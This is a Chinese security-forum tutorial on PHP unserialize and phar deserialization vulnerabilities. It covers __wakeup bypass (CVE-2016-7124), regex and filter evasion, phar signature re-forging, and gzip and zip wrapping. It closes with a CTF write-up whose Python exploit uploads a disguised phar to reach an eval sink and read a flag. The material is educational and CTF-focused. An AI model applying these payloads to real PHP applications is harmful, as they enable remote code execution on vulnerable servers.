#  php(phar)反序列化漏洞及各种绕过姿势

pank1s  [ 看雪学苑 ](javascript:void\(0\);)

**看雪学苑** ![]()

微信号 ikanxue

功能介绍 致力于移动与安全研究的开发者社区，看雪学院(kanxue.com)官方微信公众帐号。

____

___发表于_

收录于合集

![](https://gitee.com/fuli009/images/raw/master/public/20230301180801.png)  

本文为看雪论坛优秀文章

看雪论坛作者ID：pank1s

  

##  

    
    
    一  
    
    
      
    
    
     **简介**

  

序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。简单来说就是我在一个地方构造了一个类，但我要在另一个地方去使用它，那怎么传过去呢？于是就想到了序列化这种东西，将对象先序列化为一个字符串(数据)，后续需要使用的时候再进行反序列化即可得到要使用的对象，十分方便。

  

来看看官方手册（ _https://www.php.net/manual/zh/language.oop5.serialization.php_ ）怎么说：

  

所有php里面的值都可以使用函数serialize()（
_https://www.php.net/manual/zh/function.serialize.php_
）来返回一个包含字节流的字符串来表示。unserialize()（
_https://www.php.net/manual/zh/function.unserialize.php_ ）函数能够重新把字符串变回php原来的值。
序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。

  

为了能够unserialize()一个对象，这个对象的类必须已经定义过。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。
如果要想在另外一个文件中反序列化一个对象，这个对象的类必须在反序列化之前定义，可以通过包含一个定义该类的文件或使用函数spl_autoload_register()（
_https://www.php.net/manual/zh/function.spl-autoload-register.php_ ）来实现。

  

php 将数据序列化和反序列化会用到两个函数：

serialize() 将对象格式化成有序的字符串。unserialize() 将字符串还原成原来的对象。

  

序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。

  

注意：php中创建一个对象和反序列化得到一个对象是有所不同的，例如创建一个对象一般会优先调用 __construct() 方法 ，而反序列化得到一个对象若
存在 __wakeup() 方法则会优先调用它而不去执行 __construct() 。

##  

##  

    
    
    二  
    
    
      
    
    
     **常见序列化格式介绍**

  

基本上每个编程语言都有各自的序列化和反序列化方式，格式也各不相同

像有：

  * 二进制格式
  * 字节数组
  * json字符串
  * xml字符串
  * python的opCode码 参考（ _https://xz.aliyun.com/t/7436_ ）

###  

### 简单例子

  *   *   *   *   * 

    
    
    <?php$arr = array('aa', 'bb', 'cc' => 'dd');$serarr = serialize($arr);echo $serarr;var_dump($arr);

  
输出

  *   *   *   *   *   * 

    
    
    a:3:{i:0;s:2:"aa";i:1;s:2:"bb";s:2:"cc";s:2:"dd";}array(3) {    [0]=> string(2) "aa"    [1]=> string(2) "bb"    ["cc"]=> string(2) "dd"}

  
输出的这一串序列表示的是什么呢？a:3:{i:0;s:2:"aa";i:1;s:2:"bb";s:2:"cc";s:2:"dd";}a:array代表是数组，后面的3说明有三个属性。i:代表是整型数据int，后面的0是数组下标（O代表Object，也是类）。s:代表是字符串，后面的2是因为aa长度为2，是字符串长度值。后面类推。  
同时要注意序列化后只有成员变量，没有成员函数。  
  
注意如果变量前是protected，则会在变量名前加上\x00*\x00,private则会在变量名前加上\x00类名\x00,输出时一般需要url编码，如下：

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?phpclass test {    protected $name;    private $pass;    function __construct($name, $pass) {        $this->name = $name;        $this->pass = $pass;    }}$a = new test('pankas', '123');$seria = serialize($a);echo $seria.'<br/>';echo urlencode($seria);

  
直接输出输出则会导致不可见字符\x00的丢失。

  *   * 

    
    
    O:4:"test":2:{s:7:"*name";s:6:"pankas";s:10:"testpass";s:3:"123";}O%3A4%3A%22test%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A6%3A%22pankas%22%3Bs%3A10%3A%22%00test%00pass%22%3Bs%3A3%3A%22123%22%3B%7D

  
  

    
    
    三  
    
    
      
    
    
     **反序列化常用魔术方法**

  
详细用法请参考 官方文档（ _https://www.php.net/manual/zh/language.oop5.magic.php_ ）

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    __construct()//类的构造函数，创建类对象时调用 __destruct()//类的析构函数，对象销毁时调用 __call()//在对象中调用一个不可访问方法时调用 __callStatic()//用静态方式中调用一个不可访问方法时调用 __get()//获得一个类的成员变量时调用 __set()//设置一个类的成员变量时调用 __isset()//当对不可访问属性调用isset()或empty()时调用 __unset()//当对不可访问属性调用unset()时被调用。 __sleep()//执行serialize()时，先会调用这个函数 __wakeup()//执行unserialize()时，先会调用这个函数，执行后不会执行__construct()函数 __toString()//类被当成字符串时的回应方法 __invoke()//调用函数的方式调用一个对象时的回应方法 __set_state()//调用var_export()导出类时，此静态方法会被调用。 __clone()//当对象复制完成时调用 __autoload()//尝试加载未定义的类 __debugInfo()//打印所需调试信息

##  

##  

    
    
    四  
    
    
      
    
    
     **各种绕过姿势**

###  

###  绕过__wakeup(CVE-2016-7124)

  
wakeup()魔术方法在执行unserialize()时，会优先调用这个函数，而不会执行`construct()` 函数。  
绕过方法：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。  
如:

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?phpclass test{    public $a;    public function __construct(){        $this->a = 'abc';    }    public function __wakeup(){        $this->a='def';    }    public function  __destruct(){        echo $this->a;    }}

  
其序列化后为 O:4:"test":1:{s:1:"a";s:3:"abc";}  
执行反序列化 unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');  
得到结果为 def ，发现优先执行了 __wakeup() ,并没有执行 __construct()。  
当我们把对象的属性个数改大时，改成 O:4:"test":2:{s:1:"a";s:3:"abc";} ,由原来的1个属性改为2个，但test
类真实的属性只有一个，这样就能绕过 __wakeup() 按没有这个魔术方法一样去执行其他相应的魔术方法。  
执行反序列化 unserialize('O:4:"test":2:{s:1:"a";s:3:"abc";}');  
得到结果为 abc , 发现优先执行了 __construct() ,并没有执行 __wakeup()。

###  

###  **__destruct()相关**

  
__destruct是PHP对象的一个魔术方法，称为析构函数，顾名思义这是当该对象被销毁的时候自动执行的一个函数。其中以下情况会触发__destruct。

  * 主动调用unset($obj)
  * 主动调用$obj = NULL
  * 程序自动结束

  
除此之外，PHP还拥有垃圾回收Garbage collection即我们常说的GC机制。  
PHP中GC使用引用计数和回收周期自动管理内存对象，那么这时候当我们的对象变成了“垃圾”，就会被GC机制自动回收掉，回收过程中，就会调用函数的__destruct。  
刚才我们提到了引用计数，其实当一个对象没有任何引用的时候，则会被视为“垃圾”，即

  * 

    
    
    $a = new test();

  
test 对象被 变量 a 引用， 所以该对象不是“垃圾”，而如果是这样

  * 

    
    
    new test();

  
或这样

  *   * 

    
    
    $a = new test();$a = 1;

  
这样在 test 在没有被引用或在失去引用时便会被当作“垃圾”进行回收。  
如：

  *   *   *   *   *   *   *   *   * 

    
    
    <?phpclass test{function __construct($i) {$this->i = $i; }function __destruct() { echo $this->i."Destroy...\n"; }}new test('1');$a = new test('2');$a = new test('3');echo "————————————<br/>";

  
输出

  *   *   *   * 

    
    
    1Destroy...2Destroy...————————————3Destroy...

  
这里是当a第二次赋值时,test('2')失去引用，执行__destruct,然后执行echo,当程序完了后test('3')销毁，执行它的__destruct。  
举个栗子：

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?phpclass test {    function __destruct(){        echo 'success!!';    }}if(isset($_REQUEST['input'])) {    $a = unserialize($_REQUEST['input']);    throw new Exception('lose');}

  
这里我们要求输出 success!! ，但执行反序列化后得到的对象有了引用，给了 a 变量，后面程序接着就抛出一个异常，非正常结束，导致未正常完成 GC
机制，即没有执行 __destruct 。  
直接构造反序列化 test
类得到：![](https://gitee.com/fuli009/images/raw/master/public/20230301180817.png)所以我们要反序列化手动去
“销毁” 创造的对象。这里我们可以利用数组来完成。构造：

  *   *   *   *   * 

    
    
    class test {}$a = serialize(array(new test, null));echo $a.'<br/>';$a = str_replace(':1', ':0', $a);//将序列化的数组下标为0的元素给为nullecho $a;

  
得到

  *   * 

    
    
    a:2:{i:0;O:4:"test":0:{}i:1;N;}a:2:{i:0;O:4:"test":0:{}i:0;N;}//最终payload

  
传入，成功得到
success!!![]()我们序列化一个数组对象，考虑反序列化本字符串，因为反序列化的过程是顺序执行的，所以到第一个属性时，会将Array[0]设置为对象，同时我们又将Array[0]设置为null，这样前面的test对象便丢失了引用，就会被GC所捕获，就可以执行__destruct了。

###  

### 绕过正则

  
如preg_match('/^O:\d+/')匹配序列化字符串是否是对象字符串开头。  
绕过方法

  * 利用加号绕过（注意在url里传参时+要编码为%2B）。
  * 利用数组对象绕过，如 serialize(array($a)); a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?phpclass test{    public $a;    public function __construct(){        $this->a = 'abc';    }    public function  __destruct(){        echo $this->a.PHP_EOL;    }} function match($data){    if (preg_match('/^O:\d+/',$data)){        die('nonono!');    }else{        return $data;    }}$a = 'O:4:"test":1:{s:1:"a";s:3:"abc";}';// +号绕过$b = str_replace('O:4','O:+4', $a);unserialize(match($b));// 将对象放入数组绕过 serialize(array($a));unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');

###  

### 利用引用绕过

  
如下，要求输出 you success，但构造的序列化字符串中不能由 aaa

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?phpclass test {    public $a;    public $b;    public function __construct(){        $this->a = 'aaa';    }    public function __destruct(){         if($this->a === $this->b) {            echo 'you success';        }    }}if(isset($_REQUEST['input'])) {    if(preg_match('/aaa/', $_REQUEST['input'])) {       die('nonono');    }    unserialize($_REQUEST['input']);}else {    highlight_file(__FILE__);}

  
可以利用引用进行绕过

  *   *   *   *   *   *   *   *   *   * 

    
    
    class test {    public $a;    public $b;    public function __construct(){        $this->b = &$this->a;    }}$a = serialize(new test());echo $a;//O:4:"test":2:{s:1:"a";N;s:1:"b";R:2;}

  
构造引用使得 $b 和 $a 地址相同从而绕过检测，达成要求。

###  

### 16进制绕过字符的过滤

  
序列字符串中表示字符类型的s大写时，会被当成16进制解析。  
举个栗子：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?phpclass test{    public $username;    public function __construct(){        $this->username = 'admin';    }    public function  __destruct(){        echo 'success';    }}function check($data){    if(preg_match('/username/', $data)){        echo("nonono!!!</br>");    }    else{        return $data;    }}// 未作处理前，会被waf拦截$a = 'O:4:"test":1:{s:8:"username";s:5:"admin";}';$a = check($a);unserialize($a);// 将小s改为大S; 做处理后 \75是u的16进制， 成功绕过$a = 'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}';$a = check($a);unserialize($a);

  
输出  
![](https://gitee.com/fuli009/images/raw/master/public/20230301180819.png)

##  

##  

    
    
    五  
    
    
      
    
    
     **phar反序列化**

###  

###  前言

  
有关phar的基本介绍及利用方法我以前有过总结 , 参考链接（
_https://pankas.top/2022/04/28/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/_
）  
同时应该重点关注官方文档（ _https://www.php.net/manual/zh/book.phar.php_ ）中有关 phar 的介绍
(一定要关注官方文档，官方文档yyds)这里重点对我以前的总结进行补充。

###  

### 生成phar

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?phpclass TestObject {} @unlink("phar.phar");$phar = new Phar("phar.phar"); //后缀名必须为phar$phar->startBuffering();$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub$o = new TestObject();$phar->setMetadata($o); //将自定义的meta-data存入manifest$phar->addFromString("test.txt", "test"); //添加要压缩的文件//签名自动计算$phar->stopBuffering();

  
ps：注意phar中存储的对象反序列化之后会被phar对象的metadata属性引用。

###  

###  **一些绕过方式**

###  

###  当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://等绕过。

  *   *   * 

    
    
    compress.bzip://phar:///test.phar/test.txtcompress.bzip2://phar:///test.phar/test.txtcompress.zlib://phar:///home/sx/test.phar/test.txt

###  

### 也可以利用其它协议, 如 filter 过滤器。

  * 

    
    
    php://filter/read=convert.base64-encode/resource=phar://phar.phar

###  

### GIF格式验证可以通过在文件头部添加GIF89a绕过。

  *   * 

    
    
    $phar->setStub(“GIF89a”."<?php __HALT_COMPILER(); ?>"); //设置stub//生成一个phar.phar，修改后缀名为phar.gif

###  

### 过滤了__HALT_COMPILER();

### 参考 https://guokeya.github.io/post/uxwHLckwx （原理）  

###  

### 姿势1:  

  * 

    
    
    **将phar文件进行gzip压缩** ，使用压缩后phar文件同样也能反序列化 (常用)

###  

### linux下使用命令gzip phar.phar 生成。

###  

### 姿势2：

  * 

    
    
    将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过

###  

  *   *   *   *   *   *   * 

    
    
    $phar_file = serialize($exp);echo $phar_file;$zip = new ZipArchive();$res = $zip->open('1.zip',ZipArchive::CREATE);$zip->addFromString('crispr.txt', 'file content goes here');$zip->setArchiveComment($phar_file);$zip->close();

###

###  

###  **phar 文件签名修改**

  
对于某些情况，我们需要修改phar文件中的内容而达到某些需求(比如要绕过__wakeup要修改属性数量)，而修改后的phar文件由于文件发生改变，所以须要修改签名才能正常使用，官方文档中是这么说：  
Phar Signature format（
_https://www.php.net/manual/zh/phar.fileformat.signature.php#phar.fileformat.signature_
）Phars containing a signature always have the signature appended to the end of
the Phar archive after the loader, manifest, and file contents. The signature
formats supported at this time are MD5, SHA1, SHA256, SHA512, and OPENSSL.  
![](https://gitee.com/fuli009/images/raw/master/public/20230301180820.png)  
用winhex或010-editor查看phar文件签名类型（以上述代码生成的phar文件为例）![]()以默认的sha1签名为例：

  *   *   *   *   *   *   *   *   *   * 

    
    
    from hashlib import sha1with open('phar.phar', 'rb') as file:    f = file.read()     # 修改内容后的phar文件,以二进制文件形式打开 s = f[:-28] # 获取要签名的数据（对于sha1签名的phar文件，文件末尾28字节为签名的格式）h = f[-8:] # 获取签名类型以及GBMB标识，各4个字节newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB) with open('newPhar.phar', 'wb') as file:    file.write(newf) # 写入新文件

  
运行脚本得到的 newPhar.phar 就可以正常使用啦。

###  

###  **案例**

  
题目来源：NSSCTF Round#4 Team-1zweb(revenge)  
前面任意文件读取拿到源码就不说了，重点看它这个phar反序列化  
index.php：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?phpclass LoveNss{    public $ljt;    public $dky;    public $cmd;    public function __construct(){//__wakeup执行后__construct并不会执行        $this->ljt="ljt";        $this->dky="dky";        phpinfo();    }    public function __destruct(){        if($this->ljt==="Misc"&&$this->dky==="Re")            eval($this->cmd);    }    public function __wakeup(){//需要绕过__wakeup,更改序列化属性个数即可绕过        $this->ljt="Re";        $this->dky="Misc";    }}$file=$_POST['file'];if(isset($_POST['file'])){    if (preg_match("/flag/i", $file)) {        die("nonono");    }    echo file_get_contents($file);}

  
upload.php：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?phpif ($_FILES["file"]["error"] > 0){    echo "上传异常";}else{    $allowedExts = array("gif", "jpeg", "jpg", "png");    $temp = explode(".", $_FILES["file"]["name"]);    $extension = end($temp);    if (($_FILES["file"]["size"] && in_array($extension, $allowedExts))){        $content=file_get_contents($_FILES["file"]["tmp_name"]);        $pos = strpos($content, "__HALT_COMPILER();");//ban掉了明文的stub标识        if(gettype($pos)==="integer"){            echo "ltj一眼就发现了phar";        }else{            if (file_exists("./upload/" . $_FILES["file"]["name"])){                echo $_FILES["file"]["name"] . " 文件已经存在";            }else{                $myfile = fopen("./upload/".$_FILES["file"]["name"], "w");                fwrite($myfile, $content);                fclose($myfile);                echo "上传成功 ./upload/".$_FILES["file"]["name"];            }        }    }else{        echo "dky不喜欢这个文件 .".$extension;    }}?>

  
分析源码可知ban掉了 __HALT_COMPILER(); 标识，没有这个是不认phar的，这个可以使用gzip压缩进行绕过。  
__wakeup 修改序列属性个数即可绕过，注意修改完phar文件后还需重新签名，用上文的脚本即可。  
生成phar：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?phpclass LoveNss{    public $ljt;    public $dky;    public $cmd;    public function __construct($ljt, $dky, $cmd){        $this->ljt = $ljt;        $this->dky = $dky;        $this->cmd = $cmd;    }} @unlink("phar.phar");$phar = new Phar("phar.phar"); //后缀名必须为phar$phar->startBuffering();$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub$o = new LoveNss("Misc", "Re", "cat /flag");$phar->setMetadata($o); //将自定义的meta-data存入manifest$phar->addFromString("test.txt", "test"); //添加要压缩的文件//签名自动计算$phar->stopBuffering();

  
修改签名并上传文件，访问后触发phar反序列化拿到flag。  
exp:

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    import requestsfrom hashlib import sha1import gzipimport redef getPhar():    with open('phar.phar', 'rb') as file:        f = file.read()    s = f[:-28] # 获取要签名的数据（对于sha1签名的phar文件，文件末尾28字节为签名的格式）    s = s.replace(b'3:{', b'4:{')# 绕过__wakeup    h = f[-8:] # 获取签名类型以及GBMB标识，各4个字节    newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)    return gzip.compress(newf)# 进行gzip压缩 def upload(file):    burp0_url = "http://1.14.71.254:28403/upload.php"    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://1.14.71.254:28403", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfXBfemuGHEVNBhN8", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://1.14.71.254:28403/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}    burp0_data = b"------WebKitFormBoundaryfXBfemuGHEVNBhN8\r\nContent-Disposition: form-data; name=\"file\"; filename=\"phar.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n" + file + b"\r\n------WebKitFormBoundaryfXBfemuGHEVNBhN8\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n\r\n------WebKitFormBoundaryfXBfemuGHEVNBhN8--\r\n"    # 注意数据类型为byte类型，应该file为byte类型，相同数据类型才能合并    requests.post(burp0_url, headers=burp0_headers, data=burp0_data) def getFlag():    burp0_url = "http://1.14.71.254:28403/"    burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Origin": "http://1.14.71.254:28403", "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://1.14.71.254:28403/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}    burp0_data = {"file": "phar://./upload/phar.jpg/test.txt", "submit": ''}    res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)    return re.findall('(NSSCTF\{.*?\})', res.text)[0] if __name__ == '__main__':    upload(getPhar())    print(getFlag())

  
运行得到flag。![](https://gitee.com/fuli009/images/raw/master/public/20230301180822.png)ps：注意如果用burp代理抓包上传gzip压缩后的phar可能会有bug，burp会改变gzip数据，导致无法识别phar文件  

  

  

![](https://gitee.com/fuli009/images/raw/master/public/20230301180823.png)

  

 **看雪ID：pank1s**

https://bbs.kanxue.com/user-home-952339.htm

*本文由看雪论坛 pank1s 原创，转载请注明来自看雪社区  
[![](https://gitee.com/fuli009/images/raw/master/public/20230301180824.png)](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458493067&idx=2&sn=098f64ed7bb35149efbb12c7a9551b08&chksm=b18e900186f91917b83a68408448658fba17a6a55011c39e7b1c504b42539710cd466e35fa43&scene=21#wechat_redirect)  

 **#** **  往期推荐  
**

1、[Windows
2000系统的一个0day漏洞发现过程](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458495738&idx=1&sn=97f941a0ee1dfbaddc067923a065c7fb&chksm=b18e9a7086f9136614e6e161d91ee6ce3bb13b7f943441a293454e435443a1542bedc0b5efbb&scene=21#wechat_redirect)  

2、[wibu证书 -
asn1码流](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458495696&idx=1&sn=ea643585c5b3cefc1e892e55dff9f5e3&chksm=b18e9a5a86f9134c4dcf0a8c2576538494f531be8c3c3580a95bb49598596571e646ec76a077&scene=21#wechat_redirect)

3、[COM 进程注入技术-
编程技术](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458495654&idx=1&sn=fda03d0b225787f95a6491224c6b38fb&chksm=b18e9a2c86f9133a21a02d401841d2bad5190702ef38af652426a6b19afad4f0c8507edb12e1&scene=21#wechat_redirect)

4、[记录调试Windows服务的操作](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458495653&idx=2&sn=8fb257956eaf0063fd500e4548157f67&chksm=b18e9a2f86f913395a67a4c38e2f94ce34b52c547d8439eacf3d455dd63aeae8de434046feb3&scene=21#wechat_redirect)

5、[通过AFL++复现sudo漏洞的一次尝试](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458495629&idx=1&sn=cd163140cd2a646d1c721aaa2078d841&chksm=b18e9a0786f913115a83c9b0921476507e40f2b654c8f74909a28cc2986296f5c4688ecbeeed&scene=21#wechat_redirect)

6、[浅析信息的表示和处理](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458495256&idx=1&sn=a7a40804328b9112e0f63576d3a67127&chksm=b18e999286f9108422a9ff311eb7b033bc6ffed28a1913b3d3f87022b07892aa2ec2998f3fe3&scene=21#wechat_redirect)

  
![](https://gitee.com/fuli009/images/raw/master/public/20230301180825.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230301180826.png)

 **球分享**

![](https://gitee.com/fuli009/images/raw/master/public/20230301180826.png)

 **球点赞**

![](https://gitee.com/fuli009/images/raw/master/public/20230301180826.png)

 **球在看**

  

![](https://gitee.com/fuli009/images/raw/master/public/20230301180829.png)

点击“阅读原文”，了解更多！

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

